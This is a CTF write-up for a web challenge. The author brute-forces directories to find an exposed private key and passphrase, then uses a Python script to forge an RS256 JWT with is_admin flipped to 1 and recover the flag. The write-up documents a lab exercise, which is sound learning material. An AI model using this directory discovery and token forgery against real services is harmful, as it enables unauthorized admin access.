## Just Wiggle Toes
### Description
```html
We're given service url
http://jakarta.ctf.protergo.party:10003/portal_login
it turns out the service is running on laravel and nothing with it

HTTP/1.1 200 OK
Server: nginx/1.25.3
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/8.1.27
Cache-Control: no-cache, private
Date: Thu, 08 Feb 2024 21:03:01 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6IllXR1pYWDBzZDRJekF2cVF1bWdVTGc9PSIsInZhbHVlIjoiWjJUbWtPL3hnTXRWUG4vbEtudElxaDEzNm5TUHMzTlJDSEk2NUx0SWo3anJXaVJCMXNPbnNrNHdEUWltY1g0a1FNTE4wNG9CYmg4TXNXMElqcmVaR2V4RndtK21aSUpGdVpMQWZvYjlUOGgvbG4weUhNcVlGUVcyWDF1c3R3TlIiLCJtYWMiOiI2ZTJiZDE0NzRmNTMyOTZkMjFlNmFkNjhlYzIxNjBlMGMyMGE4OTNjMzViZjYxYjFjODQ4ODY2Y2U5NzgwODYzIiwidGFnIjoiIn0%3D; expires=Thu, 08 Feb 2024 23:03:01 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6IkcxWXZBNFBnenB2bGNNc0JsTUtLalE9PSIsInZhbHVlIjoiUzVwVnhYd0FZamtkUWI4VytTdkJMRXFzcE9GOGFkZTZIUGRITVFlYVRhZU5yTFMwT2cyWWFmamhLMGxXMVFJdEhyeTFvWHdTWEZtQ1IzTlVjZVJFQWtCWnBMSG5DUHptZFdNYTBVKyswL25aMkg4SS84b0M2U1B0S3BEZ0tDNzUiLCJtYWMiOiJhYWNiYzk4ZDE1NzY2NTljNWMwM2Y0NmUyYzMyYmNhYWNjMWEzZTA3OGIyYTUzOWE1ZGYwZGMwYTI5ZmY5NmVjIiwidGFnIjoiIn0%3D; expires=Thu, 08 Feb 2024 23:03:01 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Content-Length: 924

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
    <title>Home</title>
</head>
<body>

<div class="container" style="margin-top: 50px">
    <div class="row">
        <div class="col-md-5 offset-md-3">
            <div class="card">
                <div class="card-body">
                    Welcome to website!
                </div>
            </div>


        </div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/8.11.8/sweetalert2.all.min.js"></script>

</body>
</html>


```
### Reconnaissance

Im very blind with this service since robots.txt give me nothing
```
User-agent: *
Disallow:
```
and im try to use dirbuster to find another path in this service
using this wordlist
```
https://github.com/drtychai/wordlists/blob/master/dirbuster/directory-list-2.3-medium.txt
```

Luckily dirbuster found something
```
/portal_register
/portal_login
/LittleSecrets
```
![URLImage](assets/img1.png)
![URLImage](assets/img3.png)

Just download all file in LittleSecrets

After registering and login, the login endpoint give me JWT token then and redirecting to /home its turn out 

```
Welcome user!
Sorry, only admin can view the secret.
```
![URLImage](assets/img2.png)

JWT TOKEN = **eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwOi8vamFrYXJ0YS5jdGYucHJvdGVyZ28ucGFydHk6MTAwMDMvYXBpL3BvcnRhbF9sb2dpbiIsImlhdCI6MTcwNzQyNjU2NCwiZXhwIjoxNzA3NDMwMTY0LCJuYmYiOjE3MDc0MjY1NjQsImp0aSI6IlRpUFBtN3BncW9LV2VycWEiLCJzdWIiOiIzNSIsInBydiI6IjNkYTA0NTA3YWFkZjEzMmNlZTczMmZkZWU0ZWY2YWEzOTBkZWM1NzkiLCJpc19hZG1pbiI6MH0.dCWl9Z_VUa1qCcDcTUigKFmHI2BlrYjAz2KHdviAlJsuPuZQAHgnz2I0Jug6SBkXlCTat7ddaEL5-LSc3ebD0N_N7oUDnOChIU_jLAZgFnFmQax-MIc0K_iKFsf90Tdg15kV4K8p2RzJR9FmD9WSt2B79hpoOuihjJgHeg6RQZaJ3AMPhKskmK7OLS7kkelYX-CgwGWny9fdDgGasudg7OVb6yXapdMro5wjqrQGa1-A_-qC4u06jeh6Ay2NMiNY8RRMUELxzVvR_0rAsjyfVL3xXc0fxAHYzW4clQsQs45a4jy3Ll4BdhtHeZs_fDydey3lpxTbv-8yw80safMb6czbuotKyUOQlMtZHW9c4ciTssoZRJX1gY8bTNXzrI51Jj0gGmF-nQ8G4Rg3W8HVP5cC03Syi0x2z58wszrnmeQDqa8nAdIGeeq9Hl0dd_jDD906tN4JtUPrQvwEWXtniWaQeKWFo1AST1mm4ruqp7qJ8_I2nEuGANEi7yGby1ivzZEQFKkXqox38dA7klXGmd1zjuTcg-HSjldv5qCn5uyEnzK-mu-auQfO4YcOaQdNTgzxii9uaIdy5lbjwm1d-SbuMpNgdeApikSymEk8QaFjOGE0U3WJaAuXpdBWKmTz6Fo5C-5tiSXM_Z-WFP0PwVoiO-13sr-cYFJ_Q0joLr0**

What is JWT Token ?

JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.

In its compact form, JSON Web Tokens consist of three parts separated by dots (.), and encoded with base64 which are:
- Header
- Payload
- Signature

Therefore, a JWT typically looks like the following.

**xxxxx.yyyyy.zzzzz**
in my case the JWT token structure is here:

|PART|VALUE|
|-|-|
|HEADER|{"typ":"JWT","alg":"RS256"}|
|PAYLOAD|{"iss":"http://jakarta.ctf.protergo.party:10003/api/portal_login","iat":1707426564,"exp":1707430164,"nbf":1707426564,"jti":"TiPPm7pgqoKWerqa","sub":"35","prv":"3da04507aadf132cee732fdee4ef6aa390dec579","is_admin":0}|
|SIGNATURE|UNPRINTABLE ASCII CHAR|

### EXPLOITATION
Since we got all information we needed

the target for this exploitation is change **"is_admin":0** to **"is_admin":1** in the JWT token
since we already got passphrase and private.pem just craft the JWT token with the payload
```json
{
    "iss":"http://jakarta.ctf.protergo.party:10003/api/portal_login",
    "iat":1707426564,
    "exp":1707430164,
    "nbf":1707426564,
    "jti":"TiPPm7pgqoKWerqa",
    "sub":"35",
    "prv":"3da04507aadf132cee732fdee4ef6aa390dec579",
    "is_admin":1
}
```

### SOLUTION
```py
import jwt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
with open('private.pem', 'rb') as f:
    private_key_pem = f.read()

with open('passphrase', 'rb') as f:
    passphrase = f.read().strip()

private_key = serialization.load_pem_private_key(
    private_key_pem,
    password=passphrase,
    backend=default_backend()
)

payload = {
    "iss":"http://jakarta.ctf.protergo.party:10003/api/portal_login",
    "iat":1707426564,
    "exp":1707430164,
    "nbf":1707426564,
    "jti":"TiPPm7pgqoKWerqa",
    "sub":"35",
    "prv":"3da04507aadf132cee732fdee4ef6aa390dec579",
    "is_admin":1
}
token = jwt.encode(payload, private_key, algorithm='RS256')
print(token)
```
Got the token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwOi8vamFrYXJ0YS5jdGYucHJvdGVyZ28ucGFydHk6MTAwMDMvYXBpL3BvcnRhbF9sb2dpbiIsImlhdCI6MTcwNzQyNjU2NCwiZXhwIjoxNzA3NDMwMTY0LCJuYmYiOjE3MDc0MjY1NjQsImp0aSI6IlRpUFBtN3BncW9LV2VycWEiLCJzdWIiOiIzNSIsInBydiI6IjNkYTA0NTA3YWFkZjEzMmNlZTczMmZkZWU0ZWY2YWEzOTBkZWM1NzkiLCJpc19hZG1pbiI6MX0.ZxgV2DOBgXedpIJjbT6vKb2aDIwYoFa4lNA69xjJ7ntnUlU1SkjX-tQRwZf0viZgCbuEtsMtxIVFXXOHwdgmMJYksngE-JwR-V8PgoKSQRuY7q1ocXbNx_TQUZM2JyKb5Pvi0YpSLT7iZPYtOk9tN3p8G1yXSiVQTuJqzcZhsRlrwDzftNrNebJIHgxPkX3_qOxI0sNvJLI_p-oHf2sYhFV6oXyYyaPy_cY_4jIALEUDbjj73pbPDzanqG-KgWFFVmlMSHK3f27OM9O-pkkKFYpbu476W5hLsNJ0MJwlMssm_Z7w9aaoeM0o9gbmgJ8V-HG01T4AU-YCinrQTIM5W_nK5Xw7lTNZoeHAlAJaYBS4zfgIkCzwclGkOX671UiWUDBPVWuTRsCMVfxuBUByN-KshIHwhhOF3zisP1T0c57I5w70cadQNDogdWH9ug04UHO325oDSIWz67SH_rsiRWvTzrNXBi4crrJmLFP4r8M-D698lS7DGjH_tg7ZlcRqF_I1D7otebkWSm7b0TQ206Yfis22sN7PSi6bcnFrNMLXc2b-DfJ6wg6UWER2ANV125bbJZAAWddhbolswaGs6JyhSdV2csM18_1IPGFjb3A4cmqWg6zzKvceJteL4yTQFF_0XWVMVpjEA5eP746zwp3YARBRBuwcA1s3pIo3DPo

then just request to /home with that token


FLAG: **PROTERGO{f5016c424def47159321869c8e7ff4cac79b9e721c0d700cf7c0c8ab7f43b203}**